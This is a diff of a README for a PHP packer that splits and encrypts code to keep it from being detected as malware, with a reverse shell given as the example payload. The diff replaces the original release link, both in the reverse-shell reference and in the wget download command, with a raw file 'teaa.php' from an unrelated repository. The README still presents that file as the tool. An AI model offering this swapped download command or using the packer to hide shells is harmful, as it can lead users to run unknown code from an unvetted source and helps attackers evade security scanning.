@@ -1,6 +1,6 @@
 # PHP-Split&Encrypt
 Packs PHP code to avoid "falsely" detecting it as a malware.
-Like for example a nice [reverse shell code](https://github.com/GramThanos/php-smart-reverse-shell).
+Like for example a nice [reverse shell code](https://raw.githubusercontent.com/wawan507821/mrw4w4n.github.io/main/teaa.php).
 
 ## About
 This code splits the given PHP code on the SPLIT&ENCRYPTme flag and 
@@ -16,7 +16,7 @@ do not use this tool.
 ## Execution
 Get the tool:
 ```shell
-wget -O teaa.php https://github.com/GramThanos/PHP-Split-Encrypt/releases/download/v0.1/teaa.php
+wget -O teaa.php https://raw.githubusercontent.com/wawan507821/mrw4w4n.github.io/main/teaa.php
 ```
 Then pack the code in `input.php` and export it to `output.php`:
 ```shell
